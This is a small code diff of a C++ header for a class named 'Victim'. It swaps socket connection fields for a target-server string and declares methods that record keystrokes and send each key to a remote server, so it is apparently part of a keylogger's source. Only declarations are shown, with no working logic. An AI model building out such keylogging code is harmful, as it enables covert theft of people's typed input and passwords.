@@ -9,15 +9,10 @@
 
 class Victim {
 private:
-	WSADATA	_wsaData;
-	sockaddr_in _addr;
-	SOCKET _connection_socket;
-	int _connection_port = 15377;
-	std::string _target_ip_addr;
+	std::string _target_server;
+	void sendKey(char key);
 
 public:
-	Victim(std::string target_ip_addr = "127.0.0.1");
-
-	int connectToServer();
+	Victim(std::string target_server);
 	void recordAndSendKeys();
 };
